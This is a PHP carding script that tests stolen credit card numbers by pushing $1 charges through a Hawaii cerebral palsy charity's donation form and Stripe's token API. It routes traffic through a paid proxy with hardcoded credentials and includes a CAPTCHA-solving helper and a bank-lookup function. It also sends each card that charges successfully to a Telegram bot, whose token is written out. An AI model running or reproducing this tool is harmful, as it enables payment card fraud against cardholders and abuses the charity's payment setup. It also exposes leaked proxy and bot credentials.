<?php
    error_reporting(0);
    $time_start = microtime(true);
    set_time_limit(200);
    // include("firstDataMessage.php");
    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }


    function RandomString($length = 16)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
    
   function cURLc($url, $headers, $postfields, $customrequest) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            // CURLOPT_SSL_VERIFYPEER => 1, 
            // CURLOPT_SSL_VERIFYHOST => 1, 
            // CURLOPT_COOKIE => "itrack=$cookie",
            CURLOPT_HEADER => 1,
            CURLOPT_CUSTOMREQUEST => $customrequest,
            CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
    function cURL($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => $_fls,
            // CURLOPT_SSL_VERIFYPEER => 0, 
            // CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_COOKIE => "itrack=$cookie",
            CURLOPT_HEADER => 1,
            CURLOPT_CUSTOMREQUEST => $customrequest,
            CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
   
     function cURL_ProxyOn($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => $_fls,
            // CURLOPT_PROXY => "http://scraperapi.session_number=$port.ultra_premium=true.country_code=uk:f73965b26e9d8457634c8b1597c0e6da@proxy-server.scraperapi.com:8001/",
            CURLOPT_PROXY => "isp2.hydraproxy.com:9989",
            CURLOPT_PROXYUSERPWD => "rodm26298vzpo63485:SILNes0gboZ7gsle",
            CURLOPT_HEADER => 1,
            CURLOPT_COOKIE => "itrack=$cookie",
            CURLOPT_CUSTOMREQUEST => $customrequest,
            CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $amnt = 1;
    $cc = $separator[0];
    $ccbin = substr($cc, 0,6);
    $mm = $separator[1];
    $yy = $separator[2];
    $yy1 = substr($yy, 2,2);
    $cvv = $separator[3];
    $cookie = RandomString();
    $cbin = substr($cc, 0,1);
    $rnum = rand(1111,9999);
    $str = substr(randomString(), 0,7);

    if($cbin == 5){ 
    $cbin = 'masterCard'; 
    } 
    else if($cbin == 4){ 
    $cbin = 'visa'; 
    } 

function solveCaptcha($site,$siteKey,$clientKey){
$createTask =  cURLc(
        "https://api.capmonster.cloud/createTask",
        $headers = [
               "Content-Type: application/json",
                "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","task":{"type":"NoCaptchaTaskProxyless","websitUSDL":"'.$site.'","websiteKey":"'.$siteKey.'"}}',
        "POST"
    );
 $taskId = getstr(json_encode($createTask,true),'"taskId\":','}');
 $status = "processing";
 $gResponse = "";
  while ($status == "processing") {
    sleep(3);
    $getTaskResult =  cURLc(
        "https://api.capmonster.cloud/getTaskResult ",
        $headers = [
                "Content-Type: application/json",
                "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","taskId": '.$taskId.'}',
        "POST"
    );
 $status = getstr($getTaskResult,'"status":"','"');
 $gResponse = getstr($getTaskResult,'"gRecaptchaResponse":"','"');}
return $getTaskResult ;
}
     // $port = rand(10000, 11000);
 function get_bankinfo($ccbins){
    $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => "https://binov.net/",
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_HEADER => 1,
            CURLOPT_HTTPHEADER => [
            "Content-Type: application/x-www-form-urlencoded",
            "Referer: https://binov.net/",
           'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32'
            ],
            CURLOPT_POSTFIELDS => "BIN=$ccbins"
        ));
        $g_ccdets = curl_exec($ch);
        $cc_type0 = GetStr($g_ccdets, "$cc_bin</td><td>" , '</td>');
        $cc_bname = GetStr($g_ccdets, "$cc_type0</td><td>" , '</td>');
        $cc_type1 = GetStr($g_ccdets, "$cc_bname</td><td>" , '</td>');
        $cc_type2 = GetStr($g_ccdets, "$cc_type1</td><td>" , '</td>');
        $cc_country = GetStr($g_ccdets, "$cc_type2</td><td>" , '</td>');
        // return array($cc_type0 => $cc_type0, $cc_bname => $cc_bname, $cc_type1 => $cc_type1, $cc_type2 => $cc_type2, $cc_country => $cc_country);
         $CC_fDets = "Bank: $cc_bname Country: $cc_country";
         return  $CC_fDets;
}
$ips = "175.176.92.54";
$retries = 0;
$transaction_complete = false;
while ($retries < 2 && $transaction_complete == false) {
 	# code...
	$page =  cURL(
        "https://unitedcerebralpalsyhawaii.org/asp-payment-box/?product_id=1476",
        $headers = [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53'
        ],
        "",
        "GET",
        1,
        $cookie
    ); $confirm = GetStr($page, '"asp_pp_ajax_nonce":"', '"');
       $create_pi = GetStr($page, '"asp_pp_ajax_create_pi_nonce":"', '"');

   	 $get_id =  cURL(
        "https://m.stripe.com/6",
        $headers = [
        'accept: */*',
        'content-type: text/plain;charset=UTF-8',
	    'origin: https://m.stripe.network',
	    'referer: https://m.stripe.network/',
	    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53'
        ],
        "",
        "POST",
      	1,
        $cookie
    );
	    $muid =  GetStr($get_id, '"muid":"', '"');
	    $guid = GetStr($get_id, '"guid":"', '"');
	     $sid = GetStr($get_id, '"sid":"', '"');
          if (empty($guid)) {
                $guid = "N/A";
            }
          if (empty($muid)) {
                $muid = "N/A";
            }
          if (empty($sid)) {
                $sid = "N/A";
            }
     $ajax_create_pi =  cURL(
        "https://unitedcerebralpalsyhawaii.org/wp-admin/admin-ajax.php",
        $headers = [
            'accept: */*',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://unitedcerebralpalsyhawaii.org',
            'referer: https://unitedcerebralpalsyhawaii.org/asp-payment-box/?product_id=1476',
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53"
        ],
            'action=asp_pp_create_pi&nonce='.$create_pi.'&amount=100&curr=USD&product_id=1476&quantity=1&billing_details={"name":"'.$fname.' '.$lname.'","email":"'.$email.'","address":{"line1":"'.$street.'","city":"'.$city.'","state":"'.$state.'","country":"US","postal_code":"'.$postcode.'"}}&token=39b52783293ab140a57c73a776d1ccea',
        "POST",
        1,
        $cookie
    ); $pi_id = GetStr($ajax_create_pi, '"pi_id":"', '"');

   $token_method =  cURL(
        "https://api.stripe.com/v1/tokens",
        $headers = [
            "accept: application/json",
            "content-type: application/x-www-form-urlencoded",
            "origin: https://js.stripe.com",
            "referer: https://js.stripe.com/",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53"
        ],
        "card[name]=$fname+$lname&card[address_line1]=$street&card[address_city]=$city&card[address_state]=$state&card[address_zip]=$postcode&card[address_country]=US&card[number]=$cc&card[cvc]=&card[exp_month]=$mm&card[exp_year]=$yy1&guid=$guid&muid=$muid&sid=$sid&payment_user_agent=stripe.js%2Feb$str%3B+stripe-js-v3%2Feb$str&time_on_page=53887&key=pk_live_51KTYBFLudVFSQM5pVu3OmOLhAmrxnYhYLCJ7Tx74NwlLhwlcC7TzrcXA6AddRcMJmCmZA5r2CyDFYHVXEwPS9pBd00GyTKiA6w&_stripe_version=2020-03-02",
        "POST",
      	1,
        $cookie
    ); $token = GetStr($token_method, '"id": "', '"');
if (strpos($token_method, '"id": "tok_') && !strpos($token_method, '"error":')) {

     $ajax_confirm =  cURL(
        "https://unitedcerebralpalsyhawaii.org/wp-admin/admin-ajax.php",
        $headers = [
            "accept: */*",
            "content-type: application/x-www-form-urlencoded",
            "referer: https://creative27.com/?asp_action=show_pp&product_id=1476",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53"
        ],
        'action=asp_pp_confirm_pi&nonce='.$confirm.'&product_id=1476&pi_id='.$pi_id.'&token=39b52783293ab140a57c73a776d1ccea&opts={"payment_method_data":{"type":"card","card":{"token":"'.$token.'"},"billing_details":{"name":"'.$fname.' '.$lname.'","email":"'.$email.'"}}}',
        "POST",
        1,
        $cookie
    );


    $ips = GetStr($token_method, '"client_ip": "', '"');
    $response = GetStr($ajax_confirm, '"Stripe API error occurred: ','"');
}else{
     $response = GetStr($token_method, '"message": "','"');
}

        $retries = $retries + 1;
    if ($token_method !== "" || $ajax_confirm !== "" || !strpos($token_method, 'You passed an empty string') || !strpos($ajax_confirm, 'Unrecognized request URL')){
    	$transaction_complete = true;
    	}else{
    	$transaction_complete = false;
    	}
 }

  if(strpos($ajax_confirm, '"pi_id":"pi_')) {
       $cc_info = get_bankinfo($ccbins);
        echo '<tr><td><span class="badge bg-success">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged['.$amnt.'.00]$</span> <span class="badge bg-light text-dark">'.$CC_fDets.'</span></td></tr><br>';
        file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text='.$lista.' CHARGED CCN - STRPE GATE');

    }elseif(strpos($ajax_confirm, 'Stripe API error occurred:') || strpos($token_method, '"error":')) {
        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.urldecode($response).' - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
    }else {
        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">Processing unsuccessful(May be Merchant is dead or network is blocked) - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
    }



   

    unlink("cookies/$cookie.txt");

?>  